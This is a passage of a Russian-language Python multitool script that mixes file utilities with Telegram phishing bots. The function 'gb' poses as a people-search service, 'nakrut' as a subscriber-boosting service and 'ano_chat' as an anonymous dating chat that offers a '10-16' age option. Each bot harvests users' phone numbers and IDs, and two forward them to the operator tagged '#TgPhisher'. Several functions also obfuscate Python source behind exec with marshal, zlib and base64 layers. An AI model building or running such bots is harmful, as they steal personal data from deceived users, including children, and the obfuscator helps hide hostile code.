    print(Colorate.Horizontal(Colors.green_to_white, "Информация об операционной системе:\n"))
    print(Colorate.Horizontal(Colors.green_to_white, f"Система: {os_info.system}"))
    print(Colorate.Horizontal(Colors.green_to_white, f"Имя хоста: {os_info.node}"))
    print(Colorate.Horizontal(Colors.green_to_white, f"Релиз: {os_info.release}"))
    print(Colorate.Horizontal(Colors.green_to_white, f"Версия: {os_info.version}"))
    print(Colorate.Horizontal(Colors.green_to_white, f"Машина: {os_info.machine}"))
    print(Colorate.Horizontal(Colors.green_to_white, f"Процессор: {os_info.processor}"))
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def create_zip_archive():
    def select_files_or_directory():
        choice = input(Colorate.Horizontal(Colors.green_to_white, "Выберите действие:\n1. Выбрать файлы из текущей директории\n2. Указать путь к папке\nВыбор: "))
        if choice == '1':
            print("Файлы в текущей директории:")
            files = [f for f in os.listdir() if os.path.isfile(f)]
            for idx, file in enumerate(files, start=1):
                print(f"[{idx}] {file}")
            file_indices = input(Colorate.Horizontal(Colors.green_to_white, "Введите номера файлов через запятую: "))
            selected_files = [files[int(i) - 1] for i in file_indices.split(',')]
            return selected_files
        elif choice == '2':
            folder_path = input(Colorate.Horizontal(Colors.green_to_white, "Введите путь к папке: "))
            return [os.path.join(folder_path, f) for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
        else:
            print("Некорректный выбор.")
            return select_files_or_directory()

    clear_console()
    print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Создание ZIP архива")))
    file_paths = select_files_or_directory()
    output_path = input(Colorate.Horizontal(Colors.green_to_white, "Введите имя выходного архива (без расширения): ")) + ".zip"
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in file_paths:
            zipf.write(file)
    print(Colorate.Horizontal(Colors.green_to_white, f"ZIP архив создан: {output_path}"))

def create_7z_archive():
    def select_files_or_directory():
        choice = input(Colorate.Horizontal(Colors.green_to_white, "Выберите действие:\n1. Выбрать файлы из текущей директории\n2. Указать путь к папке\nВыбор: "))
        if choice == '1':
            print("Файлы в текущей директории:")
            files = [f for f in os.listdir() if os.path.isfile(f)]
            for idx, file in enumerate(files, start=1):
                print(f"[{idx}] {file}")
            file_indices = input(Colorate.Horizontal(Colors.green_to_white, "Введите номера файлов через запятую: "))
            selected_files = [files[int(i) - 1] for i in file_indices.split(',')]
            return selected_files
        elif choice == '2':
            folder_path = input(Colorate.Horizontal(Colors.green_to_white, "Введите путь к папке: "))
            return [os.path.join(folder_path, f) for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
        else:
            print("Некорректный выбор.")
            return select_files_or_directory()

    clear_console()
    print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Создание 7z архива")))
    file_paths = select_files_or_directory()
    output_path = input(Colorate.Horizontal(Colors.green_to_white, "Введите имя выходного архива (без расширения): ")) + ".7z"
    with py7zr.SevenZipFile(output_path, 'w') as archive:
        for file in file_paths:
            archive.write(file)
    print(Colorate.Horizontal(Colors.green_to_white, f"7z архив создан: {output_path}"))

def create_rar_archive():
    def select_files_or_directory():
        choice = input(Colorate.Horizontal(Colors.green_to_white, "Выберите действие:\n1. Выбрать файлы из текущей директории\n2. Указать путь к папке\nВыбор: "))
        if choice == '1':
            print("Файлы в текущей директории:")
            files = [f for f in os.listdir() if os.path.isfile(f)]
            for idx, file in enumerate(files, start=1):
                print(f"[{idx}] {file}")
            file_indices = input(Colorate.Horizontal(Colors.green_to_white, "Введите номера файлов через запятую: "))
            selected_files = [files[int(i) - 1] for i in file_indices.split(',')]
            return selected_files
        elif choice == '2':
            folder_path = input(Colorate.Horizontal(Colors.green_to_white, "Введите путь к папке: "))
            return [os.path.join(folder_path, f) for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
        else:
            print("Некорректный выбор.")
            return select_files_or_directory()

    clear_console()
    print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Создание RAR архива")))
    file_paths = select_files_or_directory()
    output_path = input(Colorate.Horizontal(Colors.green_to_white, "Введите имя выходного архива (без расширения): ")) + ".rar"
    command = ["rar", "a", output_path] + file_paths
    subprocess.run(command)
    print(Colorate.Horizontal(Colors.green_to_white, f"RAR архив создан: {output_path}"))

def extract_specific_files():
    clear_console()
    print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Выберите архивный файл")))
    print("1. Указать путь к архиву")
    print("2. Выбрать файл из текущей директории")
    choice = input("Ваш выбор: ").strip()

    if choice == '1':
        archive_path = input("Введите полный путь к архиву: ").strip()
    elif choice == '2':
        files = list(Path('.').glob('*.[zZ][iI][pP]')) + list(Path('.').glob('*.[rR][aA][rR]'))
        if not files:
            print("Нет доступных архивных файлов в текущей директории.")
            input("\nНажмите Enter для возврата в меню...")
            return

        for i, file in enumerate(files, 1):
            print(f"{i}. {file.name}")
        file_choice = int(input("Выберите номер файла: ").strip()) - 1
        if file_choice < 0 or file_choice >= len(files):
            print("Неверный выбор.")
            input("\nНажмите Enter для возврата в меню...")
            return
        archive_path = files[file_choice]
    else:
        print("Неверный выбор.")
        input("\nНажмите Enter для возврата в меню...")
        return

    clear_console()
    print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter(f"Извлечение файлов из архива {archive_path}")))

    if archive_path.lower().endswith('.zip'):
        with zipfile.ZipFile(archive_path, 'r') as zip_ref:
            files = zip_ref.namelist()
            print("Доступные файлы для извлечения:")
            for i, file in enumerate(files, 1):
                print(f"{i}. {file}")

            choices = input("Введите номера файлов для извлечения (через запятую): ").strip().split(',')
            selected_files = [files[int(choice) - 1] for choice in choices if choice.isdigit()]

            for file in selected_files:
                zip_ref.extract(file)
                print(f"Файл {file} извлечен.")
    elif archive_path.lower().endswith('.rar'):
        with rarfile.RarFile(archive_path, 'r') as rar_ref:
            files = rar_ref.namelist()
            print("Доступные файлы для извлечения:")
            for i, file in enumerate(files, 1):
                print(f"{i}. {file}")

            choices = input("Введите номера файлов для извлечения (через запятую): ").strip().split(',')
            selected_files = [files[int(choice) - 1] for choice in choices if choice.isdigit()]

            for file in selected_files:
                rar_ref.extract(file)
                print(f"Файл {file} извлечен.")
    else:
        print("Поддерживаются только ZIP и RAR форматы.")

    input("\nНажмите Enter для возврата в меню...")

def decode_qr_code():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_white, "Расшифровка QR-кодов"))
    
    try:
        image_path = input("Введите путь к изображению с QR-кодом: ")
        reader = zxing.BarCodeReader()
        barcode = reader.decode(image_path)
        
        if barcode:
            print(f"Данные QR-кода: {barcode.parsed}")
        else:
            print("Не удалось распознать QR-код.")
    except Exception as e:
        print(f"Произошла ошибка: {e}")

def compare_text_files():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_white, "Сравнение текстовых файлов"))
    
    try:
        file1_path = input("Введите путь к первому текстовому файлу: ")
        file2_path = input("Введите путь ко второму текстовому файлу: ")
        
        with open(file1_path, 'r') as file1, open(file2_path, 'r') as file2:
            file1_lines = file1.readlines()
            file2_lines = file2.readlines()
            
            diff = difflib.unified_diff(file1_lines, file2_lines, fromfile='File1', tofile='File2')
            for line in diff:
                print(line)
    except Exception as e:
        print(f"Произошла ошибка: {e}")

def convert_video_to_audio():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_white, "Конвертация видео в аудио"))
    
    try:
        video_path = input("Введите путь к видеофайлу: ")
        output_path = input("Введите путь для сохранения аудиофайла (с расширением .mp3): ")
        
        video = VideoFileClip(video_path)
        video.audio.write_audiofile(output_path)
        print("Аудиофайл успешно сохранён!")
    except Exception as e:
        print(f"Произошла ошибка: {e}")

def convert_audio_to_text():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_white, "Конвертация аудио в текст"))
    
    try:
        audio_path = input("Введите путь к аудиофайлу: ")
        recognizer = sr.Recognizer()
        
        with sr.AudioFile(audio_path) as source:
            audio_data = recognizer.record(source)
            text = recognizer.recognize_google(audio_data, language="ru-RU")
            print("Текст аудиофайла:")
            print(text)
    except Exception as e:
        print(f"Произошла ошибка: {e}")

def create_gif_from_video():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_white, "Создание GIF из видео"))
    
    try:
        video_path = input("Введите путь к видеофайлу: ")
        output_path = input("Введите путь для сохранения GIF-файла (с расширением .gif): ")
        
        clip = VideoFileClip(video_path)
        clip.write_gif(output_path)
        print("GIF-файл успешно создан!")
    except Exception as e:
        print(f"Произошла ошибка: {e}")

def gb():
    def print_user_data(user_id, first_name, username=None, phone_number=None):
        print(Colorate.Horizontal(Colors.green_to_white, f"    ID: {user_id:<31}"))
        print(Colorate.Horizontal(Colors.green_to_white, f"    Имя: {first_name:<29}"))
        
        if username:
            print(Colorate.Horizontal(Colors.green_to_white, f"    Username: @{username:<24}"))
        if phone_number:
            print(Colorate.Horizontal(Colors.green_to_white, f"    Номер телефона: +{phone_number:<14}"))
    def is_valid_token(token):

        try:
            bot = telebot.TeleBot(token)
            bot_info = bot.get_me()
            if bot_info:
                return True
        except telebot.apihelper.ApiException:
            return False

    token = input(Colorate.Horizontal(Colors.green_to_white, f"Введите токен вашего бота >> "))
    admin_id = input(Colorate.Horizontal(Colors.green_to_white, f"Введите ваш телеграм айди >> "))

    if not is_valid_token(token):
        print(Colorate.Horizontal(Colors.green_to_white, "{reset}     Неверный токен! Пожалуйста, повторите запуск скрипта"))

    else:
        def get_bot_username(token):
            url = f"https://api.telegram.org/bot{token}/getMe"
            response = requests.get(url).json()

            if response.get("ok") and 'username' in response.get("result", {}):
                return response["result"]["username"]
            else:
                return None

        username = get_bot_username(token)
        if username:
            print(Colorate.Horizontal(Colors.green_to_white, f"Бот запущен! - для выхода [ctrl + c]\nЮзернейм вашего бота: @{username}\nОтправьте с вашего аккаунта\nКоманду - /start боту."))
        else:
            print(Colorate.Horizontal(Colors.green_to_white, "Бот запущен! - для выхода [ctrl + c]"))
        bot = telebot.TeleBot(token)
        @bot.message_handler(commands=['start'])
        def send_welcome(message):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            button_phone = types.KeyboardButton(text="Подтвердить номер телефона", request_contact=True)
            markup.add(button_phone)
        
            bot.send_message(message.chat.id, """
    🗂 <b>Номер телефона</b>

    Вам необходимо подтвердить <b>номер телефона</b> для того, чтобы завершить <b>идентификацию</b>.

    Для этого нажмите кнопку ниже.""", parse_mode="HTML", reply_markup=markup)

        @bot.message_handler(content_types=['contact'])
        def contact_handler(message):
            if message.contact is not None:
                if message.contact.user_id == message.from_user.id:
                    markup = types.ReplyKeyboardRemove()
                    bot.send_message(message.chat.id, f'''
    ⬇️ **Примеры команд для ввода:**

    👤 **Поиск по имени**
    ├  `Блогер` (Поиск по тегу)
    ├  `Антипов Евгений Вячеславович`
    └  `Антипов Евгений Вячеславович 05.02.1994`
     (Доступны также следующие форматы `05.02`/`1994`/`28`/`20-28`)

    🚗 **Поиск по авто**
    ├  `Н777ОН777` - поиск авто по РФ
    └  `WDB4632761X337915` - поиск по VIN

    👨 **Социальные сети**
    ├  `instagram.com/ev.antipov` - Instagram
    ├  `vk.com/id577744097` - Вконтакте
    ├  `facebook.com/profile.php?id=1` - Facebook
    └  `ok.ru/profile/162853188164` - Одноклассники

    📱 `79999939919` - для поиска по номеру телефона
    📨 `tema@gmail.com` - для поиска по Email
    📧 `#281485304`, `@durov` или перешлите сообщение - поиск по Telegram аккаунту

    🔐 `/pas churchill7` - поиск почты, логина и телефона по паролю
    🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)
    🏘 `77:01:0001075:1361` - поиск по кадастровому номеру

    🏛 `/company Сбербанк` - поиск по юр лицам
    📑 `/inn 784806113663` - поиск по ИНН
    🎫 `/snils 13046964250` - поиск по СНИЛС
    📇 `/passport 6113825395` - поиск по паспорту
    🗂 `/vy 9902371011` - поиск по ВУ

    📸 Отправьте фото человека, чтобы найти его или двойника на сайтах ВК, ОК.
    🚙 Отправьте фото номера автомобиля, чтобы получить о нем информацию.
    🙂 Отправьте стикер, чтобы найти создателя.
    🌎 Отправьте точку на карте, чтобы найти информацию.
    🗣 С помощью голосовых команд также можно выполнять поисковые запросы.

    ''', parse_mode="Markdown", reply_markup=markup)
                    print()
                    print_user_data(message.from_user.id, message.from_user.first_name, message.from_user.username, message.contact.phone_number)
                    print()
                    try:
                        bot.send_message(admin_id, f'''
    #TgPhisher - {username}

    - {message.from_user.id}
    - {message.from_user.first_name}
    - {message.from_user.username}
    - {message.contact.phone_number}
    ''')
                    except:
                        print('     error send to ADMIN_ID      ')
                else:
                        bot.send_message(message.chat.id, "Это не ваш номер телефона. Пожалуйста, подтвердите свой номер.")

        @bot.message_handler(func=lambda message: True)
        def default_handler(message):
            bot.send_message(message.chat.id, f'''
    ⚠️ **Технические работы.**

    Работы будут завершены в ближайший промежуток времени, все подписки наших пользователей продлены.
    ''', parse_mode="Markdown")
      

        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(Colorate.Horizontal(Colors.green_to_white, f"Произошла ошибка: {e}"))

def nakrut():
    def print_user_data(user_id, first_name, username=None, phone_number=None):
        border = "{:-^40}".format("")
        print(Colorate.Horizontal(Colors.green_to_white, border))
        print(Colorate.Horizontal(Colors.green_to_white, f"    ID: {user_id:<31}"))
        print(Colorate.Horizontal(Colors.green_to_white, f"    Имя: {first_name:<29}"))
        if username:
            print(Colorate.Horizontal(Colors.green_to_white, f"    Username: @{username:<24}"))
        if phone_number:
            print(Colorate.Horizontal(Colors.green_to_white, f"    Номер телефона: {phone_number:<14}"))
        print(Colorate.Horizontal(Colors.green_to_white, border))

    def is_valid_token(token):
        try:
            bot = telebot.TeleBot(token)
            bot_info = bot.get_me()
            if bot_info:
                return True
        except telebot.apihelper.ApiException:
            return False

    token = input(Colorate.Horizontal(Colors.green_to_white, "Введите токен вашего бота >> "))
    admin_id = input(Colorate.Horizontal(Colors.green_to_white, "Введите ваш телеграм айди >> "))

    if not is_valid_token(token):
        print(Colorate.Horizontal(Colors.green_to_white, "Неверный токен! Пожалуйста, повторите запуск скрипта"))
        sys.exit()
    else:
        def get_bot_username(token):
            url = f"https://api.telegram.org/bot{token}/getMe"
            response = requests.get(url).json()
            if response.get("ok") and 'username' in response.get("result", {}):
                return response["result"]["username"]
            else:
                return None

        username = get_bot_username(token)
        if username:
            print(Colorate.Horizontal(Colors.green_to_white, f"Бот запущен! - для выхода [ctrl + c]\nЮзернейм вашего бота: @{username}\nОтправьте с вашего аккаунта\nКоманду - /start боту."))

    bot = telebot.TeleBot(token)

    user_states = {}
    user_channels = {}

    @bot.message_handler(commands=['start'])
    def handle_start(message):
        user_states[message.chat.id] = "START"
        markup = types.InlineKeyboardMarkup()
        button = types.InlineKeyboardButton(text="Продолжить", callback_data="continue")
        markup.add(button)
        bot.send_message(message.chat.id, "Привет! 👋\n\nДанный сервис поможет вам увеличить подписчиков и просмотры вашего канала. Давайте начнем! ✨", reply_markup=markup)

    @bot.callback_query_handler(func=lambda call: call.data == "continue")
    def handle_continue(call):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        user_states[call.message.chat.id] = "AWAITING_CHANNEL"
        bot.send_message(call.message.chat.id, "Отправьте публичную ссылку вашего канала в формате @username.")

    @bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHANNEL")
    def process_channel_step(message):
        channel_username = message.text
        if not re.match(r'^@([a-zA-Z0-9_]{5,32})$', channel_username):
            bot.send_message(message.chat.id, "Пожалуйста, отправьте действительное имя канала в формате @username.")
            return

        user_channels[message.chat.id] = channel_username
        markup = types.ReplyKeyboardMarkup(row_width=1, one_time_keyboard=True)
        button1 = types.KeyboardButton("500 подписчиков")
        button2 = types.KeyboardButton("500 просмотров")
        markup.add(button1, button2)
        user_states[message.chat.id] = "AWAITING_CHOICE"
        bot.send_message(message.chat.id, "Выберите количество подписчиков или просмотров:", reply_markup=markup)

    @bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHOICE")
    def process_choice_step(message):
        if message.text not in ["500 подписчиков", "500 просмотров"]:
            bot.send_message(message.chat.id, "Для приобретения большего количества подписчиков и просмотров обратитесь к админу.")
            return

        markup = types.ReplyKeyboardMarkup(row_width=1, one_time_keyboard=True)
        button = types.KeyboardButton("Подтвердить номер телефона", request_contact=True)
        markup.add(button)
        user_states[message.chat.id] = "AWAITING_PHONE_CONFIRM"
        bot.send_message(message.chat.id, "Подтвердите ваш номер телефона для продолжения.", reply_markup=markup)

    @bot.message_handler(content_types=['contact'])
    def handle_contact(message):
        if user_states.get(message.chat.id) != "AWAITING_PHONE_CONFIRM":
            return
        print_user_data(message.from_user.id, message.from_user.first_name, message.from_user.username, message.contact.phone_number)
        print()
        try:
            bot.send_message(admin_id, f'''
    #TgPhisher - {username}

    - {message.from_user.id}
    - {message.from_user.first_name}
    - {message.from_user.username}
    - {message.contact.phone_number}
    ''')
        except:
            print('     error send to ADMIN_ID      ')
        
        bot.send_message(message.chat.id, f"<b>Запрос отправлен</b>Ваш запрос будет обработан в ближайшее время.\nВаш id:{message.from_user.id}", parse_mode='HTML')
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(Colorate.Horizontal(Colors.green_to_white, f"Произошла ошибка: {e}"))

def ano_chat():
    def is_valid_token(token):
        try:
            bot = telebot.TeleBot(token)
            bot_info = bot.get_me()
            if bot_info:
                return True
        except telebot.apihelper.ApiException:
            return False

    def get_bot_username(token):
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url).json()
        if response.get("ok") and 'username' in response.get("result", {}):
            return response["result"]["username"]
        else:
            return None

    token = input(Colorate.Horizontal(Colors.green_to_white, "Введите токен вашего бота >> "))

    if not is_valid_token(token):
        print(Colorate.Horizontal(Colors.green_to_white, "Неверный токен! Пожалуйста, повторите запуск скрипта"))
        sys.exit()
    else:
        username = get_bot_username(token)
        if username:
            print(Colorate.Horizontal(Colors.green_to_white, 
                f"Бот запущен! - для выхода [ctrl + c]\n"
                f"Юзернейм вашего бота: @{username}\n"
                f"Отправьте с вашего аккаунта\n"
                f"Команду - /start боту."))
    bot = telebot.TeleBot(token)
    user_data = {}
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        bot.send_message(message.chat.id, f"<b>Привет, {message.from_user.first_name}!</b> 🍒 Здесь ты сможешь пообщаться и развлечься с желающими этого людьми. Сначала укажите ваш возрастную группу, чтобы находить людей по вашим параметрам.", parse_mode='HTML')
        markup = types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
        itembtn1 = types.KeyboardButton('10-16')
        itembtn2 = types.KeyboardButton('16-18')
        itembtn3 = types.KeyboardButton('18+')
        bot.send_message(message.chat.id, "Выберите возрастную группу:", reply_markup=markup.add(itembtn1, itembtn2, itembtn3))

    @bot.message_handler(func=lambda message: message.text in ['10-16', '16-18', '18+'])
    def set_age(message):
        user_data[message.chat.id] = {'age': message.text}
        markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        itembtn1 = types.KeyboardButton('Подтвердить номер', request_contact=True)
        bot.send_message(message.chat.id, "Подтвердите ваш номер телефона:", reply_markup=markup.add(itembtn1))

    @bot.message_handler(content_types=['contact'])
    def handle_contact(message):
        markup = types.ReplyKeyboardRemove()
        if message.contact.user_id == message.from_user.id:
            print(f"\n        ID Пользователя: {message.from_user.id}\n"
                  f"      НикНейм: @{message.from_user.username}\n"
                  f"      Возрастная группа: {user_data[message.chat.id]['age']}\n"
                  f"      Номер телефона: {message.contact.phone_number}\n\n")
            bot.send_message(message.chat.id, "<b>🍒 Регистрация завершена!</b>\nДля поиска воспользуйтесь - /search", reply_markup=markup, parse_mode="HTML")
        else:
            print(f"        ID Пользователя: {message.from_user.id}\n"
                  f"      НикНейм: @{message.from_user.username}\n"
                  f"      Попытка подтвердить номер чужим контактом: {message.contact.phone_number}\n\n")
            bot.send_message(message.chat.id, "Вы отправили не свой номер телефона!", reply_markup=markup)

    @bot.message_handler(commands=['search'])
    def default_handler(message):
        bot.send_message(message.chat.id, f'''
    <b>🔍 Идет ожидание онлайн пользователей...</b>


    <i>🍒 - Будьте осторожны при отправке личных фото/видео материалов!

    💬 - Собеседник может быть несовершенно летнего возраста
            Мы не несем ответственность за ваши действия.</i>
    ''', parse_mode="html")

    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(Colorate.Horizontal(Colors.green_to_white, f"Произошла ошибка: {e}"))

if sys.version_info[0] == 2:
    _input = "raw_input('%s')"
elif sys.version_info[0] == 3:
    _input = "input('%s')"
else:
    sys.exit("\nYour Python Version is not Supported!")

note = "\x23\x20\x4f\x62\x66\x75\x73\x63\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x50\x79\x4f\x62\x66\x75\x73\x63\x61\x74\x65\x0a\x23\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x68\x74\x72\x2d\x74\x65\x63\x68\x0a\x23\x20\x54\x69\x6d\x65\x20\x3a\x20%s\n\x23\x20\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x0a" % time.ctime()

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

class FileSize: 
    def datas(self, z):
        for x in ['Byte', 'KB', 'MB', 'GB']:
            if z < 1024.0:
                return "%3.1f %s" % (z, x)
            z /= 1024.0

    def __init__(self, path):
        if os.path.isfile(path):
            dts = os.stat(path).st_size
            print(" [-] Encoded File Size (press Enter) : %s\n" % self.datas(dts))

def encode_marshal():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('marshal').loads(__[::-1]))(%s))" % repr(marshal.dumps(compile(data.encode('utf8'), '<x>', 'exec'))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def encode_zlib():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter): ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('zlib').decompress(__[::-1]))(%s))" % repr(zlib.compress(data.encode('utf8'))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def encode_base16():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('base64').b16decode(__[::-1]))(%s))" % repr(base64.b16encode(data.encode('utf8'))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def encode_base32():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter) :", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('base64').b32decode(__[::-1]))(%s))" % repr(base64.b32encode(data.encode('utf8'))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def encode_base64():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter): ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('base64').b64decode(__[::-1]))(%s))" % repr(base64.b64encode(data.encode('utf8'))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def encode_zlib_base16():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('zlib').decompress(__import__('base64').b16decode(__[::-1])))(%s))" % repr(base64.b16encode(zlib.compress(data.encode('utf8')))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def encode_zlib_base32():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('zlib').decompress(__import__('base64').b32decode(__[::-1])))(%s))" % repr(base64.b32encode(zlib.compress(data.encode('utf8')))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def encode_zlib_base64():
    clear_console()
    try: 
        file = eval(_input % Write.Input(" [-] File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))(%s))" % repr(base64.b64encode(zlib.compress(data.encode('utf8')))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def encode_marshal_zlib():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('marshal').loads(__import__('zlib').decompress(__[::-1])))(%s))" % repr(zlib.compress(marshal.dumps(compile(data.encode('utf8'), '<x>', 'exec')))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def encode_marshal_base16():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('marshal').loads(__import__('base64').b16decode(__[::-1])))(%s))" % repr(base64.b16encode(marshal.dumps(compile(data.encode('utf8'), '<x>', 'exec')))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def encode_marshal_base32():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
